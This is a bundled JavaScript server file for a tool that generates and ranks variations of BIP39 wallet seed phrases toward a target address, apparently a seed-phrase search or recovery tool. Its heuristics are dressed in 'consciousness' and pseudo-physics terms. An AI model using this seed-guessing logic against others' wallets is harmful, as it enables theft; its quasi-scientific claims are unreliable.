        const distance = fisherDistance(prev.phrase, curr.phrase);
        const dt = curr.timestamp - prev.timestamp;
        const velocity = dt > 0 ? distance / dt : 0;
        this.velocityHistory.push(velocity);
        if (this.velocityHistory.length > this.windowSize) {
          this.velocityHistory.shift();
        }
        let acceleration = 0;
        if (this.velocityHistory.length >= 2) {
          const dv = this.velocityHistory[this.velocityHistory.length - 1] - this.velocityHistory[this.velocityHistory.length - 2];
          acceleration = dt > 0 ? dv / dt : 0;
        }
        const isSafe = velocity < this.SAFE_VELOCITY_THRESHOLD;
        const avgVelocity = this.velocityHistory.length > 0 ? this.velocityHistory.slice(-5).reduce((sum, v) => sum + v, 0) / Math.min(5, this.velocityHistory.length) : 0;
        return {
          velocity,
          acceleration,
          isSafe,
          distance,
          dt,
          avgVelocity
        };
      }
      /**
       * Check if learning rate should be reduced due to high velocity
       * 
       * PURE: This is adaptive control based on measurement, not optimization.
       * 
       * Strategy:
       * - Low velocity: normal operation (multiplier = 1.0)
       * - High velocity: reduce proportionally (multiplier < 1.0)
       * - Critical velocity: minimum multiplier (0.1)
       * 
       * @param velocityThreshold - Safety threshold (default from Gary-B)
       * @returns [shouldReduce, suggestedMultiplier]
       */
      shouldReduceLearningRate(velocityThreshold = this.SAFE_VELOCITY_THRESHOLD) {
        if (this.velocityHistory.length === 0) {
          return [false, 1];
        }
        const avgVelocity = this.velocityHistory.slice(-5).reduce((sum, v) => sum + v, 0) / Math.min(5, this.velocityHistory.length);
        if (avgVelocity <= velocityThreshold) {
          return [false, 1];
        }
        const excess = avgVelocity / velocityThreshold;
        const suggestedMultiplier = Math.max(0.1, 1 / excess);
        return [true, suggestedMultiplier];
      }
      /**
       * Get velocity statistics for telemetry
       */
      getStats() {
        if (this.velocityHistory.length === 0) {
          return {
            current: 0,
            average: 0,
            max: 0,
            min: 0,
            isSafe: true
          };
        }
        const current = this.velocityHistory[this.velocityHistory.length - 1];
        const average = this.velocityHistory.reduce((sum, v) => sum + v, 0) / this.velocityHistory.length;
        const max = Math.max(...this.velocityHistory);
        const min = Math.min(...this.velocityHistory);
        const isSafe = average < this.SAFE_VELOCITY_THRESHOLD;
        return { current, average, max, min, isSafe };
      }
      /**
       * Reset monitor (e.g., when starting new search)
       */
      reset() {
        this.history = [];
        this.velocityHistory = [];
      }
      createEmptyMeasurement() {
        return {
          velocity: 0,
          acceleration: 0,
          isSafe: true,
          distance: 0,
          dt: 0,
          avgVelocity: 0
        };
      }
    };
  }
});

// server/resonance-detector.ts
var ResonanceDetector;
var init_resonance_detector = __esm({
  "server/resonance-detector.ts"() {
    "use strict";
    init_qig_pure_v2();
    ResonanceDetector = class {
      history = [];
      kappaStar;
      resonanceWidth;
      /**
       * @param kappaStar - Optimal coupling (from physics: κ₄ = 64.47)
       * @param resonanceWidth - Half-width of resonance region
       */
      constructor(kappaStar = QIG_CONSTANTS.KAPPA_STAR, resonanceWidth = 10) {
        this.kappaStar = kappaStar;
        this.resonanceWidth = resonanceWidth;
      }
      /**
       * Check if current κ is near resonance
       * 
       * PURE: We measure proximity, we don't optimize toward it.
       * 
       * @param kappaCurrent - Current coupling strength (measured from phrase)
       * @returns Resonance measurement (pure observation)
       */
      checkResonance(kappaCurrent) {
        const distanceToOptimal = Math.abs(kappaCurrent - this.kappaStar);
        const inResonance = distanceToOptimal < this.resonanceWidth;
        const resonanceStrength = Math.max(
          0,
          1 - distanceToOptimal / this.resonanceWidth
        );
        const suggestedLRMultiplier = this.computeLearningRateMultiplier(resonanceStrength);
        this.history.push({
          kappa: kappaCurrent,
          timestamp: Date.now(),
          inResonance
        });
        if (this.history.length > 100) {
          this.history.shift();
        }
        return {
          kappa: kappaCurrent,
          distanceToOptimal,
          inResonance,
          resonanceStrength,
          suggestedLRMultiplier
        };
      }
      /**
       * Compute learning rate multiplier based on resonance proximity
       * 
       * PURE: Adaptive control based on geometry, not optimization.
       * 
       * Strategy:
       * - Far from κ*: normal LR (multiplier = 1.0)
       * - Near κ*: reduce LR proportionally (multiplier < 1.0)
       * - At κ*: minimum LR (multiplier = 0.1)
       * 
       * Rationale: Near resonance, small updates cause large Φ changes.
       * Like a swing at resonance - gentle pushes only.
       * 
       * @param resonanceStrength - Measured resonance (0-1)
       * @returns Learning rate multiplier (0.1-1.0)
       */
      computeLearningRateMultiplier(resonanceStrength) {
        if (resonanceStrength <= 0) {
          return 1;
        }
        const multiplier = 1 - 0.9 * resonanceStrength;
        return Math.max(0.1, Math.min(1, multiplier));
      }
      /**
       * Get resonance statistics for telemetry
       */
      getStats() {
        if (this.history.length === 0) {
          return {
            currentKappa: 0,
            averageKappa: 0,
            timeInResonance: 0,
            resonanceFrequency: 0
          };
        }
        const currentKappa = this.history[this.history.length - 1].kappa;
        const averageKappa = this.history.reduce((sum, h) => sum + h.kappa, 0) / this.history.length;
        const resonanceCount = this.history.filter((h) => h.inResonance).length;
        const resonanceFrequency = resonanceCount / this.history.length;
        const timeInResonance = resonanceFrequency;
        return {
          currentKappa,
          averageKappa,
          timeInResonance,
          resonanceFrequency
        };
      }
      /**
       * Check if we're approaching resonance (predictive)
       * 
       * Looks at trajectory to predict if we're moving toward κ*
       * Useful for early warning before entering high-sensitivity region
       */
      isApproachingResonance() {
        if (this.history.length < 3) {
          return false;
        }
        const recent = this.history.slice(-3);
        const dist1 = Math.abs(recent[0].kappa - this.kappaStar);
        const dist2 = Math.abs(recent[1].kappa - this.kappaStar);
        const dist3 = Math.abs(recent[2].kappa - this.kappaStar);
        return dist2 < dist1 && dist3 < dist2;
      }
      /**
       * Reset detector (e.g., when starting new search)
       */
      reset() {
        this.history = [];
      }
    };
  }
});

// server/known-phrases.ts
var KNOWN_12_WORD_PHRASES;
var init_known_phrases = __esm({
  "server/known-phrases.ts"() {
    "use strict";
    KNOWN_12_WORD_PHRASES = [
      "proof system trust network digital code private public truth safe balance simple",
      "future supply limit protect empower citizen digital network code trust balance truth",
      "simple elegant design smooth clean basic balance truth empower future digital system",
      "trust network replace allow permit control safe protect empower citizen digital truth",
      "digital network system build protect private truth safe balance simple proof future",
      "code network digital system proof truth safe protect balance simple elegant trust",
      "private network public code system digital proof safe trust balance truth future",
      "protect empower citizen digital system network simple truth balance proof code safe",
      "balance supply limit protect digital network system truth simple elegant code future",
      "truth network digital code proof system protect balance simple trust future supply",
      "safe system digital network code proof private balance truth simple elegant protect",
      "simple system elegant clean basic smooth balance digital network code truth future",
      "network digital system trust proof code safe protect balance simple truth supply",
      "empower citizen digital network protect private code system truth balance proof simple",
      "digital system network proof code truth safe balance protect simple elegant future",
      "trust digital network system code proof safe truth balance simple protect supply",
      "code digital system network proof safe truth protect balance simple trust future",
      "protect digital network system safe truth balance simple code proof trust supply",
      "balance digital network system truth proof safe protect simple elegant code future",
      "simple digital network system elegant proof truth safe balance protect code trust",
      "future digital network system supply limit protect truth balance simple elegant code",
      "truth digital network code proof system safe balance protect simple trust future",
      "safe digital network system proof code truth balance protect simple elegant trust",
      "network digital system code proof truth safe protect balance simple elegant future",
      "digital network code system proof safe truth balance protect simple trust supply",
      "proof digital network system code safe truth balance protect simple elegant future",
      "system digital network proof code safe truth balance protect simple elegant trust",
      "empower digital network citizen protect system code truth balance proof simple future",
      "protect digital network citizen empower system code truth balance simple elegant proof",
      "balance network digital system proof safe truth protect simple elegant code future",
      "simple network digital system proof elegant truth safe balance protect code trust",
      "elegant network digital system simple proof truth safe balance protect code future",
      "trust network digital code system proof safe balance protect simple truth future",
      "safe network digital code system proof truth balance protect simple elegant trust",
      "digital code network system proof safe truth balance protect simple elegant future",
      "code network digital proof system safe truth balance protect simple elegant trust",
      "proof network digital code system safe truth balance protect simple elegant future",
      "network code digital system proof safe truth balance protect simple elegant trust",
      "system code digital network proof safe truth balance protect simple elegant future",
      "truth code digital network system proof safe balance protect simple elegant future",
      "protect code digital network system proof safe truth balance simple elegant trust",
      "balance code digital network system proof safe truth protect simple elegant future",
      "simple code digital network system proof elegant truth safe balance protect trust",
      "elegant code digital network system simple proof truth safe balance protect future",
      "future code digital network system supply limit truth protect balance simple elegant"
    ];
  }
});

// server/local-search.ts
function generateLocalSearchVariations(basePhrase, maxVariations = 200) {
  const words = basePhrase.trim().split(/\s+/);
  const wordCount = words.length;
  if (wordCount < 12 || wordCount > 24) {
    throw new Error(`Invalid phrase length: ${wordCount} (must be 12-24 words)`);
  }
  const variations = /* @__PURE__ */ new Set([basePhrase]);
  for (let i = 0; i < wordCount && variations.size < maxVariations; i++) {
    const currentWord = words[i];
    const currentIndex = WORD_TO_INDEX.get(currentWord);
    if (currentIndex === void 0) continue;
    const windowSize = 50;
    for (let offset = -windowSize; offset <= windowSize && variations.size < maxVariations; offset++) {
      if (offset === 0) continue;
      const newIndex = currentIndex + offset;
      if (newIndex < 0 || newIndex >= BIP39_WORDS.length) continue;
      const newWords = [...words];
      newWords[i] = BIP39_WORDS[newIndex];
      variations.add(newWords.join(" "));
    }
  }
  for (let i = 0; i < wordCount - 1 && variations.size < maxVariations; i++) {
    const newWords = [...words];
    [newWords[i], newWords[i + 1]] = [newWords[i + 1], newWords[i]];
    variations.add(newWords.join(" "));
  }
  for (let i = 0; i < wordCount && variations.size < maxVariations; i++) {
    for (let j = i + 2; j < wordCount && variations.size < maxVariations; j++) {
      const newWords = [...words];
      [newWords[i], newWords[j]] = [newWords[j], newWords[i]];
      variations.add(newWords.join(" "));
    }
  }
  for (let i = 0; i < wordCount && variations.size < maxVariations; i++) {
    for (let j = i + 1; j < wordCount && variations.size < maxVariations; j++) {
      const index1 = WORD_TO_INDEX.get(words[i]);
      const index2 = WORD_TO_INDEX.get(words[j]);
      if (index1 === void 0 || index2 === void 0) continue;
      for (let offset1 = -10; offset1 <= 10 && variations.size < maxVariations; offset1++) {
        for (let offset2 = -10; offset2 <= 10 && variations.size < maxVariations; offset2++) {
          if (offset1 === 0 && offset2 === 0) continue;
          const newIndex1 = index1 + offset1;
          const newIndex2 = index2 + offset2;
          if (newIndex1 < 0 || newIndex1 >= BIP39_WORDS.length) continue;
          if (newIndex2 < 0 || newIndex2 >= BIP39_WORDS.length) continue;
          const newWords = [...words];
          newWords[i] = BIP39_WORDS[newIndex1];
          newWords[j] = BIP39_WORDS[newIndex2];
          variations.add(newWords.join(" "));
        }
      }
    }
  }
  const result = Array.from(variations);
  for (let i = result.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [result[i], result[j]] = [result[j], result[i]];
  }
  return result.slice(0, maxVariations);
}
var WORD_TO_INDEX;
var init_local_search = __esm({
  "server/local-search.ts"() {
    "use strict";
    init_bip39_words();
    WORD_TO_INDEX = new Map(BIP39_WORDS.map((word, i) => [word, i]));
  }
});

// server/discovery-tracker.ts
var DiscoveryTracker;
var init_discovery_tracker = __esm({
  "server/discovery-tracker.ts"() {
    "use strict";
    DiscoveryTracker = class {
      discoveryHistory = [];
      // 1 if high-Φ found in batch, 0 otherwise
      batchCount = 0;
      // Timescale windows (in batches)
      TAU_FAST = 1;
      TAU_MEDIUM = 10;
      TAU_SLOW = 100;
      /**
       * Record a batch result
       * @param highPhiFound - Number of high-Φ candidates found in this batch
       */
      recordBatch(highPhiFound) {
        this.discoveryHistory.push(highPhiFound > 0 ? 1 : 0);
        this.batchCount++;
        if (this.discoveryHistory.length > 100) {
          this.discoveryHistory.shift();
        }
      }
      /**
       * Get discovery rate at fast timescale (τ=1 batch)
       * Returns: 1.0 if last batch found high-Φ, 0.0 otherwise
       */
      getRateFast() {
        if (this.discoveryHistory.length === 0) return 0;
        return this.discoveryHistory[this.discoveryHistory.length - 1];
      }
      /**
       * Get discovery rate at medium timescale (τ=10 batches)
       * Returns: Fraction of last 10 batches that found high-Φ (0.0-1.0)
       */
      getRateMedium() {
        if (this.discoveryHistory.length === 0) return 0;
        const window = Math.min(this.TAU_MEDIUM, this.discoveryHistory.length);
        const recent = this.discoveryHistory.slice(-window);
        const discoveries = recent.reduce((sum, val) => sum + val, 0);
        return discoveries / window;
      }
      /**
       * Get discovery rate at slow timescale (τ=100 batches)
       * Returns: Fraction of all batches (up to 100) that found high-Φ (0.0-1.0)
       */
      getRateSlow() {
        if (this.discoveryHistory.length === 0) return 0;
        const discoveries = this.discoveryHistory.reduce((sum, val) => sum + val, 0);
        return discoveries / this.discoveryHistory.length;
      }
      /**
       * Detect if search is stagnating (no discoveries in recent batches)
       * Returns true if medium-term discovery rate drops below threshold
       */
      isStagnating(threshold = 0.05) {
        if (this.batchCount < this.TAU_MEDIUM) return false;
        return this.getRateMedium() < threshold;
      }
      /**
       * Detect if we're in a productive basin (frequent discoveries)
       * Returns true if medium-term rate is above threshold
       */
      isProductive(threshold = 0.2) {
        if (this.batchCount < this.TAU_MEDIUM) return false;
        return this.getRateMedium() > threshold;
      }
      /**
       * Get exploration vs investigation recommendation
       * Based on discovery rate patterns across timescales
       */
      getRecommendedMode() {
        if (this.batchCount < this.TAU_MEDIUM) {
          return "exploration";
        }
        const rateFast = this.getRateFast();
        const rateMedium = this.getRateMedium();
        const rateSlow = this.getRateSlow();
        if (rateFast > 0 && rateMedium > 0.1) {
          return "investigation";
        }
        if (rateMedium > rateSlow * 1.5 && rateMedium > 0.15) {
          return "investigation";
        }
        if (rateMedium < 0.05 || rateMedium < rateSlow * 0.5) {
          return "exploration";
        }
        return "exploration";
      }
      /**
       * Get all rates for telemetry
       */
      getAllRates() {
        return {
          fast: this.getRateFast(),
          medium: this.getRateMedium(),
          slow: this.getRateSlow(),
          batchCount: this.batchCount
        };
      }
    };
  }
});

// server/telemetry-api.ts
import { Router } from "express";
function initTelemetrySession(jobId) {
  const session2 = {
    sessionId: jobId,
    startTime: Date.now(),
    snapshots: [],
    regimeTransitions: [],
    resonanceEvents: [],
    stats: {
      avgPhi: 0,
      avgKappa: 0,
      maxQuality: 0,
      regimeDistribution: {},
      totalBasinDrift: 0
    }
  };
  telemetrySessions.set(jobId, session2);
  return session2;
}
function recordTelemetrySnapshot(jobId, snapshot) {
  let session2 = telemetrySessions.get(jobId);
  if (!session2) {
    session2 = initTelemetrySession(jobId);
  }
  const fullSnapshot = {
    ...snapshot,
    timestamp: Date.now()
  };
  if (session2.snapshots.length > 0) {
    const lastSnapshot = session2.snapshots[session2.snapshots.length - 1];
    if (lastSnapshot.regime !== fullSnapshot.regime) {
      session2.regimeTransitions.push({
        from: lastSnapshot.regime,
        to: fullSnapshot.regime,
        timestamp: fullSnapshot.timestamp,
        phi: fullSnapshot.phi,
        kappa: fullSnapshot.kappa
      });
    }
    session2.stats.totalBasinDrift += fullSnapshot.basinDrift;
  }
  if (fullSnapshot.inResonance) {
    const lastEvent = session2.resonanceEvents[session2.resonanceEvents.length - 1];
    if (lastEvent && fullSnapshot.timestamp - lastEvent.timestamp < 5e3) {
      lastEvent.duration = fullSnapshot.timestamp - lastEvent.timestamp;
    } else {
      session2.resonanceEvents.push({
        timestamp: fullSnapshot.timestamp,
        kappa: fullSnapshot.kappa,
        duration: 0
      });
    }
  }
  session2.snapshots.push(fullSnapshot);
  if (session2.snapshots.length > 1e3) {
    session2.snapshots = session2.snapshots.slice(-1e3);
  }
  updateStats(session2);
}
function updateStats(session2) {
  const snapshots = session2.snapshots;
  if (snapshots.length === 0) return;
  let phiSum = 0;
  let kappaSum = 0;
  let maxQuality = 0;
  const regimeCounts = {};
  for (const s of snapshots) {
    phiSum += s.phi;
    kappaSum += s.kappa;
    if (s.quality > maxQuality) maxQuality = s.quality;
    regimeCounts[s.regime] = (regimeCounts[s.regime] || 0) + 1;
  }
  session2.stats.avgPhi = phiSum / snapshots.length;
  session2.stats.avgKappa = kappaSum / snapshots.length;
  session2.stats.maxQuality = maxQuality;
  session2.stats.regimeDistribution = regimeCounts;
}
function getTelemetrySession(jobId) {
  return telemetrySessions.get(jobId) || null;
}
function endTelemetrySession(jobId, options = { success: true }) {
  const session2 = telemetrySessions.get(jobId);
  if (!session2) {
    return null;
  }
  updateStats(session2);
  const endTime = Date.now();
  const duration = endTime - session2.startTime;
  console.log(`[Telemetry] Session ${jobId} ended:`, {
    success: options.success,
    duration: `${(duration / 1e3).toFixed(1)}s`,
    snapshots: session2.snapshots.length,
    regimeTransitions: session2.regimeTransitions.length,
    resonanceEvents: session2.resonanceEvents.length,
    avgPhi: session2.stats.avgPhi.toFixed(3),
    avgKappa: session2.stats.avgKappa.toFixed(1),
    maxQuality: session2.stats.maxQuality.toFixed(3)
  });
  const removeAfterMs = options.removeAfterMs ?? 5 * 60 * 1e3;
  if (removeAfterMs > 0) {
    setTimeout(() => {
      telemetrySessions.delete(jobId);
      console.log(`[Telemetry] Session ${jobId} cleaned up`);
    }, removeAfterMs);
  }
  return session2;
}
var router, telemetrySessions;
var init_telemetry_api = __esm({
  "server/telemetry-api.ts"() {
    "use strict";
    init_storage();
    router = Router();
    telemetrySessions = /* @__PURE__ */ new Map();
    router.get("/:jobId", async (req, res) => {
      try {
        const { jobId } = req.params;
        const session2 = getTelemetrySession(jobId);
        if (!session2) {
          return res.status(404).json({
            error: "Telemetry session not found",
            message: `No telemetry data for job '${jobId}'. Start a search to generate telemetry.`
          });
        }
        const recentSnapshots = session2.snapshots.slice(-100);
        res.json({
          sessionId: session2.sessionId,
          startTime: session2.startTime,
          uptime: Date.now() - session2.startTime,
          snapshotCount: session2.snapshots.length,
          recentSnapshots,
          regimeTransitions: session2.regimeTransitions,
          resonanceEvents: session2.resonanceEvents,
          stats: session2.stats
        });
      } catch (error) {
        res.status(500).json({ error: error.message });
      }
    });
    router.get("/:jobId/trajectory", async (req, res) => {
      try {
        const { jobId } = req.params;
        const limit = parseInt(req.query.limit) || 500;
        const session2 = getTelemetrySession(jobId);
        if (!session2) {
          return res.status(404).json({ error: "Telemetry session not found" });
        }
        const snapshots = session2.snapshots.slice(-limit);
        const trajectory = {
          timestamps: snapshots.map((s) => s.timestamp),
          phi: snapshots.map((s) => s.phi),
          kappa: snapshots.map((s) => s.kappa),
          beta: snapshots.map((s) => s.beta),
          quality: snapshots.map((s) => s.quality),
          regimes: snapshots.map((s) => s.regime)
        };
        res.json({
          jobId,
          pointCount: snapshots.length,
          trajectory,
          summary: {
            phiRange: [Math.min(...trajectory.phi), Math.max(...trajectory.phi)],
            kappaRange: [Math.min(...trajectory.kappa), Math.max(...trajectory.kappa)],
            qualityRange: [Math.min(...trajectory.quality), Math.max(...trajectory.quality)]
          }
        });
      } catch (error) {
        res.status(500).json({ error: error.message });
      }
    });
    router.get("/:jobId/events", async (req, res) => {
      try {
        const { jobId } = req.params;
        const session2 = getTelemetrySession(jobId);
        if (!session2) {
          return res.status(404).json({ error: "Telemetry session not found" });
        }
        res.json({
          jobId,
          regimeTransitions: session2.regimeTransitions,
          resonanceEvents: session2.resonanceEvents,
          transitionCount: session2.regimeTransitions.length,
          resonanceCount: session2.resonanceEvents.length,
          totalResonanceTime: session2.resonanceEvents.reduce((sum, e) => sum + e.duration, 0)
        });
      } catch (error) {
        res.status(500).json({ error: error.message });
      }
    });
    router.get("/:jobId/live", async (req, res) => {
      try {
        const { jobId } = req.params;
        const session2 = getTelemetrySession(jobId);
        if (!session2 || session2.snapshots.length === 0) {
          return res.json({
            jobId,
            live: null,
            status: "no_data"
          });
        }
        const latest = session2.snapshots[session2.snapshots.length - 1];
        const previous = session2.snapshots.length > 1 ? session2.snapshots[session2.snapshots.length - 2] : latest;
        res.json({
          jobId,
          live: latest,
          delta: {
            phi: latest.phi - previous.phi,
            kappa: latest.kappa - previous.kappa,
            quality: latest.quality - previous.quality
          },
          trend: {
            phiTrend: latest.phi > previous.phi ? "up" : latest.phi < previous.phi ? "down" : "stable",
            kappaTrend: latest.kappa > previous.kappa ? "up" : latest.kappa < previous.kappa ? "down" : "stable"
          },
          stats: session2.stats
        });
      } catch (error) {
        res.status(500).json({ error: error.message });
      }
    });
    router.get("/", async (req, res) => {
      try {
        const sessions2 = [];
        telemetrySessions.forEach((session2, jobId) => {
          const lastSnapshot = session2.snapshots[session2.snapshots.length - 1];
          sessions2.push({
            sessionId: jobId,
            startTime: session2.startTime,
            snapshotCount: session2.snapshots.length,
            lastActivity: lastSnapshot?.timestamp || session2.startTime,
            avgPhi: session2.stats.avgPhi,
            avgKappa: session2.stats.avgKappa
          });
        });
        sessions2.sort((a, b) => b.lastActivity - a.lastActivity);
        res.json({
          activeSessions: sessions2.length,
          sessions: sessions2
        });
      } catch (error) {
        res.status(500).json({ error: error.message });
      }
    });
  }
});

// server/consciousness-search-controller.ts
function getSharedController() {
  if (!sharedController) {
    sharedController = new ConsciousnessSearchController();
  }
  return sharedController;
}
var DEFAULT_CONFIG, ConsciousnessSearchController, sharedController;
var init_consciousness_search_controller = __esm({
  "server/consciousness-search-controller.ts"() {
    "use strict";
    init_qig_universal();
    init_physics_constants();
    DEFAULT_CONFIG = {
      targetAddress: "",
      explorationBatchSize: 1e3,
      balancedBatchSize: 500,
      precisionBatchSize: 100,
      breakdownCooldownMs: 5e3
    };
    ConsciousnessSearchController = class {
      state;
      history = [];
      config;
      lastBreakdownTime = 0;
      totalCandidatesTested = 0;
      constructor(config = {}) {
        this.config = { ...DEFAULT_CONFIG, ...config };
        this.state = this.createInitialState();
      }
      createInitialState() {
        return {
          currentRegime: "linear",
          phi: 0.5,
          kappa: 50,
          beta: QIG_CONSTANTS.BETA,
          basinDrift: 0,
          curiosity: 0.5,
          stability: 1,
          timestamp: Date.now(),
          // Initial 32-dimensional basin coordinates (center of manifold)
          basinCoordinates: Array(32).fill(0.5)
        };
      }
      /**
       * Compute Fisher distance between two basin coordinate vectors
       * PURE PRINCIPLE: Use Fisher-Rao metric, not Euclidean
       * 
       * d_F² = Σ (Δθᵢ)² / σᵢ²
       * where σᵢ² is the variance (from Fisher metric)
       */
      fisherDistanceFromCoordinates(coords1, coords2) {
        let distanceSquared = 0;
        const n = Math.min(coords1.length, coords2.length);
        for (let i = 0; i < n; i++) {
          const delta = coords1[i] - coords2[i];
          const avgCoord = (coords1[i] + coords2[i]) / 2;
          const variance = Math.max(0.01, avgCoord * (1 - avgCoord));
          distanceSquared += delta * delta / variance;
        }
        return Math.sqrt(distanceSquared);
      }
      /**
       * Update state based on recent candidate scores (array of full scores)
       */
      updateState(recentScores) {
        if (recentScores.length === 0) return;
        const avgPhi = recentScores.reduce((sum, s) => sum + s.phi, 0) / recentScores.length;
        const avgKappa = recentScores.reduce((sum, s) => sum + s.kappa, 0) / recentScores.length;
        const beta = this.computeBeta(recentScores);
        const avgBasinCoordinates = this.computeCentroidCoordinates(recentScores);
        const basinDrift = this.computeBasinDriftFisher(recentScores, avgBasinCoordinates);
        const regimeCounts = {
          linear: 0,
          geometric: 0,
          hierarchical: 0,
          hierarchical_4d: 0,
          "4d_block_universe": 0,
          breakdown: 0
        };
        for (const s of recentScores) {
          regimeCounts[s.regime]++;
        }
        const dominantRegime = Object.entries(regimeCounts).sort((a, b) => b[1] - a[1])[0][0];
        const previousState = this.state;
        this.state = {
          currentRegime: dominantRegime,
          phi: avgPhi,
          kappa: avgKappa,
          beta,
          basinDrift,
          curiosity: this.computeCuriosity(recentScores),
          stability: this.computeStability(previousState, dominantRegime),
          timestamp: Date.now(),
          basinCoordinates: avgBasinCoordinates
        };
        this.history.push(this.state);
        if (this.history.length > 1e3) {
          this.history = this.history.slice(-500);
        }
      }
      /**
       * Compute centroid basin coordinates from scores
       */
      computeCentroidCoordinates(scores) {
        if (scores.length === 0) return Array(32).fill(0.5);
        const n = scores[0].basinCoordinates.length;
        const centroid = Array(n).fill(0);
        for (const score of scores) {
          for (let i = 0; i < n; i++) {
            centroid[i] += score.basinCoordinates[i];
          }
        }
        for (let i = 0; i < n; i++) {
          centroid[i] /= scores.length;
        }
        return centroid;
      }
      /**
       * Update state from aggregate batch statistics
       * Used by search coordinator to feed batch results without full score objects
       * 
       * Note: When full scores are not available, we estimate basin coordinates
       * from the Φ and κ values using a probabilistic mapping.
       */
      updateFromBatchStats(stats2) {
        const { avgPhi, highPhiCount, totalTested, batchSize, currentKappa, avgBasinCoordinates } = stats2;
        let regime = "linear";
        if (currentKappa > 90 || currentKappa < 10) {
          regime = "breakdown";
        } else if (avgPhi >= QIG_CONSTANTS.PHI_THRESHOLD) {
          if (avgPhi > 0.85 && currentKappa < 40) {
            regime = "hierarchical";
          } else {
            regime = "geometric";
          }
        } else if (avgPhi >= 0.45 && currentKappa >= 30 && currentKappa <= 80 || avgPhi >= 0.5) {
          regime = "geometric";
        }
        const discoveryRate = highPhiCount / batchSize;
        const previousPhi = this.state.phi;
        const previousKappa = this.state.kappa;
        const dPhi = avgPhi - previousPhi;
        const dKappa = currentKappa - previousKappa;
        const estimatedBeta = Math.abs(dPhi) > 1e-3 ? dKappa / dPhi : QIG_CONSTANTS.BETA;
        const beta = 0.7 * QIG_CONSTANTS.BETA + 0.3 * Math.max(-1, Math.min(1, estimatedBeta));
        const newBasinCoords = avgBasinCoordinates || this.estimateBasinCoordinates(avgPhi, currentKappa);
        const fisherDist = this.fisherDistanceFromCoordinates(this.state.basinCoordinates, newBasinCoords);
        const basinDrift = this.state.basinDrift + fisherDist;
        const curiosity = discoveryRate > 0.1 ? 0.8 : discoveryRate > 0.01 ? 0.5 : 0.3;
        const previousState = this.state;
        this.state = {
          currentRegime: regime,
          phi: avgPhi,
          kappa: currentKappa,
          beta,
          basinDrift,
          curiosity,
          stability: this.computeStability(previousState, regime),
          timestamp: Date.now(),
          basinCoordinates: newBasinCoords
        };
        this.history.push(this.state);
        if (this.history.length > 1e3) {
          this.history = this.history.slice(-500);
        }
        console.log(`[ConsciousnessController] State updated: regime=${regime} \u03A6=${avgPhi.toFixed(3)} \u03BA=${currentKappa.toFixed(1)} Fisher drift=${fisherDist.toFixed(4)} tested=${totalTested}`);
      }
      /**
       * Estimate basin coordinates from Φ and κ when full coordinates unavailable
       * 
       * This maps (Φ, κ) back to an approximate basin location using
       * the inverse of the coordinate → QIG metric relationship.
       */
      estimateBasinCoordinates(phi, kappa) {
        const coords = Array(32).fill(0);
        const integrationInfluence = phi * 0.8;
        for (let i = 0; i < 16; i++) {
          coords[i] = 0.5 + (integrationInfluence - 0.4) * Math.sin((i + 1) * Math.PI / 16);
        }
        const normalizedKappa = kappa / QIG_CONSTANTS.KAPPA_STAR;
        for (let i = 16; i < 32; i++) {
          coords[i] = 0.5 + (normalizedKappa - 1) * 0.3 * Math.cos((i - 15) * Math.PI / 16);
        }
        return coords.map((c) => Math.max(0.01, Math.min(0.99, c)));
      }
      /**
       * Get recommended batch size based on current regime
       */
      getRecommendedBatchSize() {
        switch (this.state.currentRegime) {
          case "linear":
            return this.config.explorationBatchSize;
          case "geometric":
            return this.config.balancedBatchSize;
          case "hierarchical":
            return this.config.precisionBatchSize;
          case "breakdown":
            return Math.floor(this.config.precisionBatchSize / 2);
          default:
            return this.config.balancedBatchSize;
        }
      }
      /**
       * Filter and prioritize candidates based on current regime
       * 
       * TACKING STRATEGY:
       * - Linear: Random shuffling for broad exploration
       * - Geometric: QIG-guided selection with resonance bonus
       * - Hierarchical: Very selective, high-precision filtering
       * - Breakdown: Safety pause or minimal processing
       */
      prioritizeCandidates(candidates, batchSize) {
        if (this.state.currentRegime === "breakdown") {
          if (Date.now() - this.lastBreakdownTime < this.config.breakdownCooldownMs) {
            console.log("[ConsciousnessController] In breakdown cooldown, skipping batch");
            return [];
          }
          this.lastBreakdownTime = Date.now();
        }
        switch (this.state.currentRegime) {
          case "linear":
            return this.explorationMode(candidates, batchSize);
          case "geometric":
            return this.balancedMode(candidates, batchSize);
          case "hierarchical":
            return this.precisionMode(candidates, batchSize);
          case "breakdown":
            return this.safetyMode(candidates, batchSize);
          default:
            return this.balancedMode(candidates, batchSize);
        }
      }
      /**
       * Exploration mode: Random shuffling for broad coverage
       * Used when κ < 40 (linear regime)
       */
      explorationMode(candidates, batchSize) {
        const shuffled = [...candidates].sort(() => Math.random() - 0.5);
        return shuffled.slice(0, batchSize).map((c) => c.phrase);
      }
      /**
       * Balanced mode: QIG-guided selection with resonance awareness
       * Used when 40 < κ < 70 (geometric regime)
       */
      balancedMode(candidates, batchSize) {
        const scored = candidates.map((c) => ({
          phrase: c.phrase,
          score: c.score || scoreUniversalQIG(c.phrase, "arbitrary")
        }));
        scored.sort((a, b) => {
          const resonanceA = a.score.inResonance ? 1.5 : 1;
          const resonanceB = b.score.inResonance ? 1.5 : 1;
          const scoreA = a.score.phi * resonanceA;
          const scoreB = b.score.phi * resonanceB;
          return scoreB - scoreA;
        });
        return scored.slice(0, batchSize).map((c) => c.phrase);
      }
      /**
       * Precision mode: Very selective, high-Φ filtering
       * Used when κ > 70 (hierarchical regime)
       */
      precisionMode(candidates, batchSize) {
        const scored = candidates.map((c) => ({
          phrase: c.phrase,
          score: c.score || scoreUniversalQIG(c.phrase, "arbitrary")
        }));
        const filtered = scored.filter((c) => c.score.phi > QIG_CONSTANTS.PHI_THRESHOLD && c.score.inResonance).sort((a, b) => b.score.phi - a.score.phi);
        if (filtered.length < batchSize / 2) {
          const remaining = scored.filter((c) => c.score.phi > 0.6).sort((a, b) => b.score.phi - a.score.phi);
          return remaining.slice(0, batchSize).map((c) => c.phrase);
        }
        return filtered.slice(0, batchSize).map((c) => c.phrase);
      }
      /**
       * Safety mode: Minimal processing during breakdown
       * Used when κ > 100 (breakdown regime)
       */
      safetyMode(candidates, batchSize) {
        console.log("[ConsciousnessController] BREAKDOWN REGIME - Simplifying search");
        const simpleBatch = Math.floor(batchSize / 4);
        return candidates.slice(0, simpleBatch).map((c) => c.phrase);
      }
      /**
       * Compute running coupling constant β
       */
      computeBeta(scores) {
        if (scores.length < 2) return QIG_CONSTANTS.BETA;
        let betaSum = 0;
        for (let i = 1; i < scores.length; i++) {
